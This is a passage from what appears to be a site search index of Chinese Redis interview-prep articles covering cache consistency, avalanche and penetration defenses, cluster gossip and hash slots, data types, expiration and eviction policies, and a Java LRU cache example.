BB：很多解决方案我也没太弄明白）。我个人觉得引入缓存之后，如果为了短时间的不一致性问题，选择让系统设计变得更加复杂的话，完全没必要。\n下面单独对 Cache Aside Pattern（旁路缓存模式） 来聊聊。\nCache Aside Pattern 中遇到写请求是这样的：更新 DB，然后直接删除 cache 。\n如果更新数据库成功，而删除缓存这一步失败的情况的话，简单说两个解决方案：\n 缓存失效时间变短（不推荐，治标不治本） ：我们让缓存数据的过期时间变短，这样的话缓存就会从数据库中加载数据。另外，这种解决办法对于先操作缓存后操作数据库的场景不适用。 增加 cache 更新重试机制（常用）： 如果 cache 服务当前不可用导致缓存删除失败的话，我们就隔一段时间进行重试，重试次数可以自己定。如果多次重试还是失败的话，我们可以把当前更新失败的 key 存入队列中，等缓存服务可用之后，再将缓存中对应的 key 删除即可。  参考     《Redis 开发与运维》 《Redis 设计与实现》 Redis 命令总结：http://Redisdoc.com/string/set.html 通俗易懂的 Redis 数据结构基础教程：https://juejin.im/post/5b53ee7e5188251aaa2d2e16 WHY Redis choose single thread (vs multi threads): https://medium.com/@jychen7/sharing-redis-single-thread-vs-multi-threads-5870bd44d153  "},{"id":279,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/redis-caching-avalanche-and-caching-penetration/","title":"redis-caching-avalanche-and-caching-penetration","parent":"高并发","content":"面试题    了解什么是 Redis 的雪崩、穿透和击穿？Redis 崩溃之后会怎么样？系统该如何应对这种情况？如何处理 Redis 的穿透？\n面试官心理分析    其实这是问到缓存必问的，因为缓存雪崩和穿透，是缓存最大的两个问题，要么不出现，一旦出现就是致命性的问题，所以面试官一定会问你。\n面试题剖析    缓存雪崩    对于系统 A，假设每天高峰期每秒 5000 个请求，本来缓存在高峰期可以扛住每秒 4000 个请求，但是缓存机器意外发生了全盘宕机。缓存挂了，此时 1 秒 5000 个请求全部落数据库，数据库必然扛不住，它会报一下警，然后就挂了。此时，如果没有采用什么特别的方案来处理这个故障，DBA 很着急，重启数据库，但是数据库立马又被新的流量给打死了。\n这就是缓存雪崩。\n大约在 3 年前，国内比较知名的一个互联网公司，曾因为缓存事故，导致雪崩，后台系统全部崩溃，事故从当天下午持续到晚上凌晨 3~4 点，公司损失了几千万。\n缓存雪崩的事前事中事后的解决方案如下：\n 事前：Redis 高可用，主从+哨兵，Redis cluster，避免全盘崩溃。 事中：本地 ehcache 缓存 + hystrix 限流\u0026amp;降级，避免 MySQL 被打死。 事后：Redis 持久化，一旦重启，自动从磁盘上加载数据，快速恢复缓存数据。  用户发送一个请求，系统 A 收到请求后，先查本地 ehcache 缓存，如果没查到再查 Redis。如果 ehcache 和 Redis 都没有，再查数据库，将数据库中的结果，写入 ehcache 和 Redis 中。\n限流组件，可以设置每秒的请求，有多少能通过组件，剩余的未通过的请求，怎么办？走降级！可以返回一些默认的值，或者友情提示，或者空值。\n好处：\n 数据库绝对不会死，限流组件确保了每秒只有多少个请求能通过。 只要数据库不死，就是说，对用户来说，2/5 的请求都是可以被处理的。 只要有 2/5 的请求可以被处理，就意味着你的系统没死，对用户来说，可能就是点击几次刷不出来页面，但是多点几次，就可以刷出来了。  缓存穿透    对于系统 A，假设一秒 5000 个请求，结果其中 4000 个请求是黑客发出的恶意攻击。\n黑客发出的那 4000 个攻击，缓存中查不到，每次你去数据库里查，也查不到。\n举个栗子。数据库 id 是从 1 开始的，结果黑客发过来的请求 id 全部都是负数。这样的话，缓存中不会有，请求每次都“视缓存于无物”，直接查询数据库。这种恶意攻击场景的缓存穿透就会直接把数据库给打死。\n解决方式很简单，每次系统 A 从数据库中只要没查到，就写一个空值到缓存里去，比如 set -999 UNKNOWN 。然后设置一个过期时间，这样的话，下次有相同的 key 来访问的时候，在缓存失效之前，都可以直接从缓存中取数据。\n当然，如果黑客如果每次使用不同的负数 id 来攻击，写空值的方法可能就不奏效了。更为经常的做法是在缓存之前增加布隆过滤器，将数据库中所有可能的数据哈希映射到布隆过滤器中。然后对每个请求进行如下判断：\n 请求数据的 key 不存在于布隆过滤器中，可以确定数据就一定不会存在于数据库中，系统可以立即返回不存在。 请求数据的 key 存在于布隆过滤器中，则继续再向缓存中查询。  使用布隆过滤器能够对访问的请求起到了一定的初筛作用，避免了因数据不存在引起的查询压力。\n缓存击穿    缓存击穿，就是说某个 key 非常热点，访问非常频繁，处于集中式高并发访问的情况，当这个 key 在失效的瞬间，大量的请求就击穿了缓存，直接请求数据库，就像是在一道屏障上凿开了一个洞。\n不同场景下的解决方式可如下：\n 若缓存的数据是基本不会发生更新的，则可尝试将该热点数据设置为永不过期。 若缓存的数据更新不频繁，且缓存刷新的整个流程耗时较少的情况下，则可以采用基于 Redis、zookeeper 等分布式中间件的分布式互斥锁，或者本地互斥锁以保证仅少量的请求能请求数据库并重新构建缓存，其余线程则在锁释放后能访问到新缓存。 若缓存的数据更新频繁或者在缓存刷新的流程耗时较长的情况下，可以利用定时线程在缓存过期前主动地重新构建缓存或者延后缓存的过期时间，以保证所有的请求能一直访问到对应的缓存。  "},{"id":280,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/redis-cas/","title":"redis-cas","parent":"高并发","content":"面试题    Redis 的并发竞争问题是什么？如何解决这个问题？了解 Redis 事务的 CAS 方案吗？\n面试官心理分析    这个也是线上非常常见的一个问题，就是多客户端同时并发写一个 key，可能本来应该先到的数据后到了，导致数据版本错了；或者是多客户端同时获取一个 key，修改值之后再写回去，只要顺序错了，数据就错了。\n而且 Redis 自己就有天然解决这个问题的 CAS 类的乐观锁方案。\n面试题剖析    某个时刻，多个系统实例都去更新某个 key。可以基于 zookeeper 实现分布式锁。每个系统通过 zookeeper 获取分布式锁，确保同一时间，只能有一个系统实例在操作某个 key，别人都不允许读和写。\n你要写入缓存的数据，都是从 mysql 里查出来的，都得写入 mysql 中，写入 mysql 中的时候必须保存一个时间戳，从 mysql 查出来的时候，时间戳也查出来。\n每次要写之前，先判断一下当前这个 value 的时间戳是否比缓存里的 value 的时间戳要新。如果是的话，那么可以写，否则，就不能用旧的数据覆盖新的数据。\n"},{"id":281,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/redis-cluster/","title":"redis-cluster","parent":"高并发","content":"面试题    Redis 集群模式的工作原理能说一下么？在集群模式下，Redis 的 key 是如何寻址的？分布式寻址都有哪些算法？了解一致性 hash 算法吗？\n面试官心理分析    在前几年，Redis 如果要搞几个节点，每个节点存储一部分的数据，得借助一些中间件来实现，比如说有 codis ，或者 twemproxy ，都有。有一些 Redis 中间件，你读写 Redis 中间件，Redis 中间件负责将你的数据分布式存储在多台机器上的 Redis 实例中。\n这两年，Redis 不断在发展，Redis 也不断有新的版本，现在的 Redis 集群模式，可以做到在多台机器上，部署多个 Redis 实例，每个实例存储一部分的数据，同时每个 Redis 主实例可以挂 Redis 从实例，自动确保说，如果 Redis 主实例挂了，会自动切换到 Redis 从实例上来。\n现在 Redis 的新版本，大家都是用 Redis cluster 的，也就是 Redis 原生支持的 Redis 集群模式，那么面试官肯定会就 Redis cluster 对你来个几连炮。要是你没用过 Redis cluster，正常，以前很多人用 codis 之类的客户端来支持集群，但是起码你得研究一下 Redis cluster 吧。\n如果你的数据量很少，主要是承载高并发高性能的场景，比如你的缓存一般就几个 G，单机就足够了，可以使用 replication，一个 master 多个 slaves，要几个 slave 跟你要求的读吞吐量有关，然后自己搭建一个 sentinel 集群去保证 Redis 主从架构的高可用性。\nRedis cluster，主要是针对海量数据+高并发+高可用的场景。Redis cluster 支撑 N 个 Redis master node，每个 master node 都可以挂载多个 slave node。这样整个 Redis 就可以横向扩容了。如果你要支撑更大数据量的缓存，那就横向扩容更多的 master 节点，每个 master 节点就能存放更多的数据了。\n面试题剖析    Redis cluster 介绍     自动将数据进行分片，每个 master 上放一部分数据 提供内置的高可用支持，部分 master 不可用时，还是可以继续工作的  在 Redis cluster 架构下，每个 Redis 要放开两个端口号，比如一个是 6379，另外一个就是 加 1w 的端口号，比如 16379。\n16379 端口号是用来进行节点间通信的，也就是 cluster bus 的东西，cluster bus 的通信，用来进行故障检测、配置更新、故障转移授权。cluster bus 用了另外一种二进制的协议， gossip 协议，用于节点间进行高效的数据交换，占用更少的网络带宽和处理时间。\n节点间的内部通信机制    基本通信原理    集群元数据的维护有两种方式：集中式、Gossip 协议。Redis cluster 节点间采用 gossip 协议进行通信。\n集中式是将集群元数据（节点信息、故障等等）集中存储在某个节点上。集中式元数据集中存储的一个典型代表，就是大数据领域的 storm 。它是分布式的大数据实时计算引擎，是集中式的元数据存储的结构，底层基于 zookeeper（分布式协调的中间件）对所有元数据进行存储维护。\nRedis 维护集群元数据采用另一个方式， gossip 协议，所有节点都持有一份元数据，不同的节点如果出现了元数据的变更，就不断将元数据发送给其它的节点，让其它节点也进行元数据的变更。\n集中式的好处在于，元数据的读取和更新，时效性非常好，一旦元数据出现了变更，就立即更新到集中式的存储中，其它节点读取的时候就可以感知到；不好在于，所有的元数据的更新压力全部集中在一个地方，可能会导致元数据的存储有压力。\ngossip 好处在于，元数据的更新比较分散，不是集中在一个地方，更新请求会陆陆续续打到所有节点上去更新，降低了压力；不好在于，元数据的更新有延时，可能导致集群中的一些操作会有一些滞后。\n  10000 端口：每个节点都有一个专门用于节点间通信的端口，就是自己提供服务的端口号+10000，比如 7001，那么用于节点间通信的就是 17001 端口。每个节点每隔一段时间都会往另外几个节点发送 ping 消息，同时其它几个节点接收到 ping 之后返回 pong 。\n  交换的信息：信息包括故障信息，节点的增加和删除，hash slot 信息等等。\n  gossip 协议    gossip 协议包含多种消息，包含 ping , pong , meet , fail 等等。\n meet：某个节点发送 meet 给新加入的节点，让新节点加入集群中，然后新节点就会开始与其它节点进行通信。  Redis-trib.rb add-node 其实内部就是发送了一个 gossip meet 消息给新加入的节点，通知那个节点去加入我们的集群。\n ping：每个节点都会频繁给其它节点发送 ping，其中包含自己的状态还有自己维护的集群元数据，互相通过 ping 交换元数据。 pong：返回 ping 和 meeet，包含自己的状态和其它信息，也用于信息广播和更新。 fail：某个节点判断另一个节点 fail 之后，就发送 fail 给其它节点，通知其它节点说，某个节点宕机啦。  ping 消息深入    ping 时要携带一些元数据，如果很频繁，可能会加重网络负担。\n每个节点每秒会执行 10 次 ping，每次会选择 5 个最久没有通信的其它节点。当然如果发现某个节点通信延时达到了 cluster_node_timeout / 2 ，那么立即发送 ping，避免数据交换延时过长，落后的时间太长了。比如说，两个节点之间都 10 分钟没有交换数据了，那么整个集群处于严重的元数据不一致的情况，就会有问题。所以 cluster_node_timeout 可以调节，如果调得比较大，那么会降低 ping 的频率。\n每次 ping，会带上自己节点的信息，还有就是带上 1/10 其它节点的信息，发送出去，进行交换。至少包含 3 个其它节点的信息，最多包含 总节点数减 2 个其它节点的信息。\n分布式寻址算法     hash 算法（大量缓存重建） 一致性 hash 算法（自动缓存迁移）+ 虚拟节点（自动负载均衡） Redis cluster 的 hash slot 算法  hash 算法    来了一个 key，首先计算 hash 值，然后对节点数取模。然后打在不同的 master 节点上。一旦某一个 master 节点宕机，所有请求过来，都会基于最新的剩余 master 节点数去取模，尝试去取数据。这会导致大部分的请求过来，全部无法拿到有效的缓存，导致大量的流量涌入数据库。\n一致性 hash 算法    一致性 hash 算法将整个 hash 值空间组织成一个虚拟的圆环，整个空间按顺时针方向组织，下一步将各个 master 节点（使用服务器的 ip 或主机名）进行 hash。这样就能确定每个节点在其哈希环上的位置。\n来了一个 key，首先计算 hash 值，并确定此数据在环上的位置，从此位置沿环顺时针“行走”，遇到的第一个 master 节点就是 key 所在位置。\n在一致性哈希算法中，如果一个节点挂了，受影响的数据仅仅是此节点到环空间前一个节点（沿着逆时针方向行走遇到的第一个节点）之间的数据，其它不受影响。增加一个节点也同理。\n燃鹅，一致性哈希算法在节点太少时，容易因为节点分布不均匀而造成缓存热点的问题。为了解决这种热点问题，一致性 hash 算法引入了虚拟节点机制，即对每一个节点计算多个 hash，每个计算结果位置都放置一个虚拟节点。这样就实现了数据的均匀分布，负载均衡。\nRedis cluster 的 hash slot 算法    Redis cluster 有固定的 16384 个 hash slot，对每个 key 计算 CRC16 值，然后对 16384 取模，可以获取 key 对应的 hash slot。\nRedis cluster 中每个 master 都会持有部分 slot，比如有 3 个 master，那么可能每个 master 持有 5000 多个 hash slot。hash slot 让 node 的增加和移除很简单，增加一个 master，就将其他 master 的 hash slot 移动部分过去，减少一个 master，就将它的 hash slot 移动到其他 master 上去。移动 hash slot 的成本是非常低的。客户端的 api，可以对指定的数据，让他们走同一个 hash slot，通过 hash tag 来实现。\n任何一台机器宕机，另外两个节点，不影响的。因为 key 找的是 hash slot，不是机器。\nRedis cluster 的高可用与主备切换原理    Redis cluster 的高可用的原理，几乎跟哨兵是类似的。\n判断节点宕机    如果一个节点认为另外一个节点宕机，那么就是 pfail ，主观宕机。如果多个节点都认为另外一个节点宕机了，那么就是 fail ，客观宕机，跟哨兵的原理几乎一样，sdown，odown。\n在 cluster-node-timeout 内，某个节点一直没有返回 pong ，那么就被认为 pfail 。\n如果一个节点认为某个节点 pfail 了，那么会在 gossip ping 消息中， ping 给其他节点，如果超过半数的节点都认为 pfail 了，那么就会变成 fail 。\n从节点过滤    对宕机的 master node，从其所有的 slave node 中，选择一个切换成 master node。\n检查每个 slave node 与 master node 断开连接的时间，如果超过了 cluster-node-timeout * cluster-slave-validity-factor ，那么就没有资格切换成 master 。\n从节点选举    每个从节点，都根据自己对 master 复制数据的 offset，来设置一个选举时间，offset 越大（复制数据越多）的从节点，选举时间越靠前，优先进行选举。\n所有的 master node 开始 slave 选举投票，给要进行选举的 slave 进行投票，如果大部分 master node （N/2 + 1） 都投票给了某个从节点，那么选举通过，那个从节点可以切换成 master。\n从节点执行主备切换，从节点切换为主节点。\n与哨兵比较    整个流程跟哨兵相比，非常类似，所以说，Redis cluster 功能强大，直接集成了 replication 和 sentinel 的功能。\n"},{"id":282,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/redis-consistence/","title":"redis-consistence","parent":"高并发","content":"面试题    如何保证缓存与数据库的双写一致性？\n面试官心理分析    你只要用缓存，就可能会涉及到缓存与数据库双存储双写，你只要是双写，就一定会有数据一致性的问题，那么你如何解决一致性问题？\n面试题剖析    一般来说，如果允许缓存可以稍微的跟数据库偶尔有不一致的情况，也就是说如果你的系统不是严格要求 “缓存+数据库” 必须保持一致性的话，最好不要做这个方案，即：读请求和写请求串行化，串到一个内存队列里去。\n串行化可以保证一定不会出现不一致的情况，但是它也会导致系统的吞吐量大幅度降低，用比正常情况下多几倍的机器去支撑线上的一个请求。\nCache Aside Pattern    最经典的缓存+数据库读写的模式，就是 Cache Aside Pattern。\n 读的时候，先读缓存，缓存没有的话，就读数据库，然后取出数据后放入缓存，同时返回响应。 更新的时候，先更新数据库，然后再删除缓存。  为什么是删除缓存，而不是更新缓存？\n原因很简单，很多时候，在复杂点的缓存场景，缓存不单单是数据库中直接取出来的值。\n比如可能更新了某个表的一个字段，然后其对应的缓存，是需要查询另外两个表的数据并进行运算，才能计算出缓存最新的值的。\n另外更新缓存的代价有时候是很高的。是不是说，每次修改数据库的时候，都一定要将其对应的缓存更新一份？也许有的场景是这样，但是对于比较复杂的缓存数据计算的场景，就不是这样了。如果你频繁修改一个缓存涉及的多个表，缓存也频繁更新。但是问题在于，这个缓存到底会不会被频繁访问到？\n举个栗子，一个缓存涉及的表的字段，在 1 分钟内就修改了 20 次，或者是 100 次，那么缓存更新 20 次、100 次；但是这个缓存在 1 分钟内只被读取了 1 次，有大量的冷数据。实际上，如果你只是删除缓存的话，那么在 1 分钟内，这个缓存不过就重新计算一次而已，开销大幅度降低。用到缓存才去算缓存。\n其实删除缓存，而不是更新缓存，就是一个 lazy 计算的思想，不要每次都重新做复杂的计算，不管它会不会用到，而是让它到需要被使用的时候再重新计算。像 mybatis，hibernate，都有懒加载思想。查询一个部门，部门带了一个员工的 list，没有必要说每次查询部门，都把里面的 1000 个员工的数据也同时查出来啊。80% 的情况，查这个部门，就只是要访问这个部门的信息就可以了。先查部门，同时要访问里面的员工，那么这个时候只有在你要访问里面的员工的时候，才会去数据库里面查询 1000 个员工。\n最初级的缓存不一致问题及解决方案    问题：先更新数据库，再删除缓存。如果删除缓存失败了，那么会导致数据库中是新数据，缓存中是旧数据，数据就出现了不一致。\n解决思路 1：先删除缓存，再更新数据库。如果数据库更新失败了，那么数据库中是旧数据，缓存中是空的，那么数据不会不一致。因为读的时候缓存没有，所以去读了数据库中的旧数据，然后更新到缓存中。\n解决思路 2：延时双删。依旧是先更新数据库，再删除缓存，唯一不同的是，我们把这个删除的动作，在不久之后再执行一次，比如 5s 之后。\npublic void set(key, value) { putToDb(key, value); deleteFromRedis(key); // ... a few seconds later  deleteFromRedis(key); } 删除的动作，可以有多种选择，比如：1. 使用 DelayQueue，会随着 JVM 进程的死亡，丢失更新的风险；2. 放在 MQ，但编码复杂度为增加。总之，我们需要综合各种因素去做设计，选择一个最合理的解决方案。\n比较复杂的数据不一致问题分析    数据发生了变更，先删除了缓存，然后要去修改数据库，此时还没修改。一个请求过来，去读缓存，发现缓存空了，去查询数据库，查到了修改前的旧数据，放到了缓存中。随后数据变更的程序完成了数据库的修改。完了，数据库和缓存中的数据不一样了\u0026hellip;\n为什么上亿流量高并发场景下，缓存会出现这个问题？\n只有在对一个数据在并发的进行读写的时候，才可能会出现这种问题。其实如果说你的并发量很低的话，特别是读并发很低，每天访问量就 1 万次，那么很少的情况下，会出现刚才描述的那种不一致的场景。但是问题是，如果每天的是上亿的流量，每秒并发读是几万，每秒只要有数据更新的请求，就可能会出现上述的数据库+缓存不一致的情况。\n解决方案如下：\n更新数据的时候，根据数据的唯一标识，将操作路由之后，发送到一个 jvm 内部队列中。读取数据的时候，如果发现数据不在缓存中，那么将重新执行“读取数据+更新缓存”的操作，根据唯一标识路由之后，也发送到同一个 jvm 内部队列中。\n一个队列对应一个工作线程，每个工作线程串行拿到对应的操作，然后一条一条的执行。这样的话，一个数据变更的操作，先删除缓存，然后再去更新数据库，但是还没完成更新。此时如果一个读请求过来，没有读到缓存，那么可以先将缓存更新的请求发送到队列中，此时会在队列中积压，然后同步等待缓存更新完成。\n这里有一个优化点，一个队列中，其实多个更新缓存请求串在一起是没意义的，因此可以做过滤，如果发现队列中已经有一个更新缓存的请求了，那么就不用再放个更新请求操作进去了，直接等待前面的更新操作请求完成即可。\n待那个队列对应的工作线程完成了上一个操作的数据库的修改之后，才会去执行下一个操作，也就是缓存更新的操作，此时会从数据库中读取最新的值，然后写入缓存中。\n如果请求还在等待时间范围内，不断轮询发现可以取到值了，那么就直接返回；如果请求等待的时间超过一定时长，那么这一次直接从数据库中读取当前的旧值。\n高并发的场景下，该解决方案要注意的问题：\n 读请求长时阻塞  由于读请求进行了非常轻度的异步化，所以一定要注意读超时的问题，每个读请求必须在超时时间范围内返回。\n该解决方案，最大的风险点在于说，可能数据更新很频繁，导致队列中积压了大量更新操作在里面，然后读请求会发生大量的超时，最后导致大量的请求直接走数据库。务必通过一些模拟真实的测试，看看更新数据的频率是怎样的。\n另外一点，因为一个队列中，可能会积压针对多个数据项的更新操作，因此需要根据自己的业务情况进行测试，可能需要部署多个服务，每个服务分摊一些数据的更新操作。如果一个内存队列里居然会挤压 100 个商品的库存修改操作，每个库存修改操作要耗费 10ms 去完成，那么最后一个商品的读请求，可能等待 10 * 100 = 1000ms = 1s 后，才能得到数据，这个时候就导致读请求的长时阻塞。\n一定要做根据实际业务系统的运行情况，去进行一些压力测试，和模拟线上环境，去看看最繁忙的时候，内存队列可能会挤压多少更新操作，可能会导致最后一个更新操作对应的读请求，会 hang 多少时间，如果读请求在 200ms 返回，如果你计算过后，哪怕是最繁忙的时候，积压 10 个更新操作，最多等待 200ms，那还可以的。\n如果一个内存队列中可能积压的更新操作特别多，那么你就要加机器，让每个机器上部署的服务实例处理更少的数据，那么每个内存队列中积压的更新操作就会越少。\n其实根据之前的项目经验，一般来说，数据的写频率是很低的，因此实际上正常来说，在队列中积压的更新操作应该是很少的。像这种针对读高并发、读缓存架构的项目，一般来说写请求是非常少的，每秒的 QPS 能到几百就不错了。\n我们来实际粗略测算一下。\n如果一秒有 500 的写操作，如果分成 5 个时间片，每 200ms 就 100 个写操作，放到 20 个内存队列中，每个内存队列，可能就积压 5 个写操作。每个写操作性能测试后，一般是在 20ms 左右就完成，那么针对每个内存队列的数据的读请求，也就最多 hang 一会儿，200ms 以内肯定能返回了。\n经过刚才简单的测算，我们知道，单机支撑的写 QPS 在几百是没问题的，如果写 QPS 扩大了 10 倍，那么就扩容机器，扩容 10 倍的机器，每个机器 20 个队列。\n 读请求并发量过高  这里还必须做好压力测试，确保恰巧碰上上述情况的时候，还有一个风险，就是突然间大量读请求会在几十毫秒的延时 hang 在服务上，看服务能不能扛的住，需要多少机器才能扛住最大的极限情况的峰值。\n但是因为并不是所有的数据都在同一时间更新，缓存也不会同一时间失效，所以每次可能也就是少数数据的缓存失效了，然后那些数据对应的读请求过来，并发量应该也不会特别大。\n 多服务实例部署的请求路由  可能这个服务部署了多个实例，那么必须保证说，执行数据更新操作，以及执行缓存更新操作的请求，都通过 Nginx 服务器路由到相同的服务实例上。\n比如说，对同一个商品的读写请求，全部路由到同一台机器上。可以自己去做服务间的按照某个请求参数的 hash 路由，也可以用 Nginx 的 hash 路由功能等等。\n 热点商品的路由问题，导致请求的倾斜  万一某个商品的读写请求特别高，全部打到相同的机器的相同的队列里面去了，可能会造成某台机器的压力过大。就是说，因为只有在商品数据更新的时候才会清空缓存，然后才会导致读写并发，所以其实要根据业务系统去看，如果更新频率不是太高的话，这个问题的影响并不是特别大，但是的确可能某些机器的负载会高一些。\n 关于这道面试题的详细讨论，见 #54。\n"},{"id":283,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/redis-data-types/","title":"redis-data-types","parent":"高并发","content":"面试题    Redis 都有哪些数据类型？分别在哪些场景下使用比较合适？\n面试官心理分析    除非是面试官感觉看你简历，是工作 3 年以内的比较初级的同学，可能对技术没有很深入的研究，面试官才会问这类问题。否则，在宝贵的面试时间里，面试官实在不想多问。\n其实问这个问题，主要有两个原因：\n 看看你到底有没有全面的了解 Redis 有哪些功能，一般怎么来用，啥场景用什么，就怕你别就会最简单的 KV 操作； 看看你在实际项目里都怎么玩儿过 Redis。  要是你回答的不好，没说出几种数据类型，也没说什么场景，你完了，面试官对你印象肯定不好，觉得你平时就是做个简单的 set 和 get。\n面试题剖析    Redis 主要有以下几种数据类型：\n Strings Hashes Lists Sets Sorted Sets   Redis 除了这 5 种数据类型之外，还有 Bitmaps、HyperLogLogs、Streams 等。\n Strings    这是最简单的类型，就是普通的 set 和 get，做简单的 KV 缓存。\nset college szu Hashes    这个是类似 map 的一种结构，这个一般就是可以将结构化的数据，比如一个对象（前提是这个对象没嵌套其他的对象）给缓存在 Redis 里，然后每次读写缓存的时候，可以就操作 hash 里的某个字段。\nhset person name bingo hset person age 20 hset person id 1 hget person name (person = { \u0026#34;name\u0026#34;: \u0026#34;bingo\u0026#34;, \u0026#34;age\u0026#34;: 20, \u0026#34;id\u0026#34;: 1 }) Lists    Lists 是有序列表，这个可以玩儿出很多花样。\n比如可以通过 list 存储一些列表型的数据结构，类似粉丝列表、文章的评论列表之类的东西。\n比如可以通过 lrange 命令，读取某个闭区间内的元素，可以基于 list 实现分页查询，这个是很棒的一个功能，基于 Redis 实现简单的高性能分页，可以做类似微博那种下拉不断分页的东西，性能高，就一页一页走。\n# 0开始位置，-1结束位置，结束位置为-1时，表示列表的最后一个位置，即查看所有。 lrange mylist 0 -1 比如可以搞个简单的消息队列，从 list 头怼进去，从 list 尾巴那里弄出来。\nlpush mylist 1 lpush mylist 2 lpush mylist 3 4 5 # 1 rpop mylist Sets    Sets 是无序集合，自动去重。\n直接基于 set 将系统里需要去重的数据扔进去，自动就给去重了，如果你需要对一些数据进行快速的全局去重，你当然也可以基于 jvm 内存里的 HashSet 进行去重，但是如果你的某个系统部署在多台机器上呢？得基于 Redis 进行全局的 set 去重。\n可以基于 set 玩儿交集、并集、差集的操作，比如交集吧，可以把两个人的粉丝列表整一个交集，看看俩人的共同好友是谁？对吧。\n把两个大 V 的粉丝都放在两个 set 中，对两个 set 做交集。\n#-------操作一个set------- # 添加元素 sadd mySet 1 # 查看全部元素 smembers mySet # 判断是否包含某个值 sismember mySet 3 # 删除某个/些元素 srem mySet 1 srem mySet 2 4 # 查看元素个数 scard mySet # 随机删除一个元素 spop mySet #-------操作多个set------- # 将一个set的元素移动到另外一个set smove yourSet mySet 2 # 求两set的交集 sinter yourSet mySet # 求两set的并集 sunion yourSet mySet # 求在yourSet中而不在mySet中的元素 sdiff yourSet mySet Sorted Sets    Sorted Sets 是排序的 set，去重但可以排序，写进去的时候给一个分数，自动根据分数排序。\nzadd board 85 zhangsan zadd board 72 lisi zadd board 96 wangwu zadd board 63 zhaoliu # 获取排名前三的用户（默认是升序，所以需要 rev 改为降序） zrevrange board 0 3 # 获取某用户的排名 zrank board zhaoliu "},{"id":284,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/redis-expiration-policies-and-lru/","title":"redis-expiration-policies-and-lru","parent":"高并发","content":"面试题    Redis 的过期策略都有哪些？内存淘汰机制都有哪些？手写一下 LRU 代码实现？\n面试官心理分析    如果你连这个问题都不知道，上来就懵了，回答不出来，那线上你写代码的时候，想当然的认为写进 Redis 的数据就一定会存在，后面导致系统各种 bug，谁来负责？\n常见的有两个问题：\n 往 Redis 写入的数据怎么没了？  可能有同学会遇到，在生产环境的 Redis 经常会丢掉一些数据，写进去了，过一会儿可能就没了。我的天，同学，你问这个问题就说明 Redis 你就没用对啊。Redis 是缓存，你给当存储了是吧？\n啥叫缓存？用内存当缓存。内存是无限的吗，内存是很宝贵而且是有限的，磁盘是廉价而且是大量的。可能一台机器就几十个 G 的内存，但是可以有几个 T 的硬盘空间。Redis 主要是基于内存来进行高性能、高并发的读写操作的。\n那既然内存是有限的，比如 Redis 就只能用 10G，你要是往里面写了 20G 的数据，会咋办？当然会干掉 10G 的数据，然后就保留 10G 的数据了。那干掉哪些数据？保留哪些数据？当然是干掉不常用的数据，保留常用的数据了。\n 数据明明过期了，怎么还占用着内存？  这是由 Redis 的过期策略来决定。\n面试题剖析    Redis 过期策略    Redis 过期策略是：定期删除+惰性删除。\n所谓定期删除，指的是 Redis 默认是每隔 100ms 就随机抽取一些设置了过期时间的 key，检查其是否过期，如果过期就删除。\n假设 Redis 里放了 10w 个 key，都设置了过期时间，你每隔几百毫秒，就检查 10w 个 key，那 Redis 基本上就死了，cpu 负载会很高的，消耗在你的检查过期 key 上了。注意，这里可不是每隔 100ms 就遍历所有的设置过期时间的 key，那样就是一场性能上的灾难。实际上 Redis 是每隔 100ms 随机抽取一些 key 来检查和删除的。\n但是问题是，定期删除可能会导致很多过期 key 到了时间并没有被删除掉，那咋整呢？所以就是惰性删除了。这就是说，在你获取某个 key 的时候，Redis 会检查一下 ，这个 key 如果设置了过期时间那么是否过期了？如果过期了此时就会删除，不会给你返回任何东西。\n 获取 key 的时候，如果此时 key 已经过期，就删除，不会返回任何东西。\n 但是实际上这还是有问题的，如果定期删除漏掉了很多过期 key，然后你也没及时去查，也就没走惰性删除，此时会怎么样？如果大量过期 key 堆积在内存里，导致 Redis 内存块耗尽了，咋整？\n答案是：走内存淘汰机制。\n内存淘汰机制    Redis 内存淘汰机制有以下几个：\n noeviction: 当内存不足以容纳新写入数据时，新写入操作会报错，这个一般没人用吧，实在是太恶心了。 allkeys-lru：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的 key（这个是最常用的）。 allkeys-random：当内存不足以容纳新写入数据时，在键空间中，随机移除某个 key，这个一般没人用吧，为啥要随机，肯定是把最近最少使用的 key 给干掉啊。 volatile-lru：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，移除最近最少使用的 key（这个一般不太合适）。 volatile-random：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，随机移除某个 key。 volatile-ttl：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，有更早过期时间的 key 优先移除。  手写一个 LRU 算法    LRU 就是 Least Recently Used 的缩写，翻译过来就是“最近最少使用”。也就是说 LRU 算法会将最近最少用的缓存移除，让给最新使用的缓存。而往往最常读取的，也就是读取次数最多的，所以利用好 LRU 算法，我们能够提供对热点数据的缓存效率，能够提高缓存服务的内存使用率。\n那么如何实现呢？\n其实，实现的思路非常简单，就像下面这张图种描述的一样。\n你可以现场手写最原始的 LRU 算法，那个代码量太大了，似乎不太现实。\n不求自己纯手工从底层开始打造出自己的 LRU，但是起码要知道如何利用已有的 JDK 数据结构实现一个 Java 版的 LRU。\npublic class LRUCache\u0026lt;K, V\u0026gt; extends LinkedHashMap\u0026lt;K, V\u0026gt; { private int capacity; /** * 传递进来最多能缓存多少数据 * * @param capacity 缓存大小 */ public LRUCache(int capacity) { super(capacity, 0.75f, true); this.capacity = capacity; } /** * 如果map中的数据量大于设定的最大容量，返回true，再新加入对象时删除最老的数据 * * @param eldest 最老的数据项 * @return true则移除最老的数据 */ @Override protected boolean removeEldestEntry(Map.Entry\u0026lt;K, V\u0026gt; eldest) { // 当 map中的数据量大于指定的缓存个数的时候，自动移除最老的数据  return size() \u0026gt; capacity; } } "},{"id":285,"href":"/%E9%AB%98%E5%B9%B6%E5%8F%91/redis-master-slave/","title":"redis-master-slave","parent":"高并发","content":"Redis 主从架构    单机的 Redis，能够承载的 QPS 大概就在上万到几万不等。对于缓存来说，一般都是用来支撑读高并发的。因此架构做成主从(master-slave)架构，一主多从，主负责写，并且将数据复制到其它的 slave 节点，从节点负责读。所有的读请求全部走从节点。这样也可以很轻松实现水平扩容，支撑读高并发。\nRedis replication -\u0026gt; 主从架构 -\u0026gt; 读写分离 -\u0026gt; 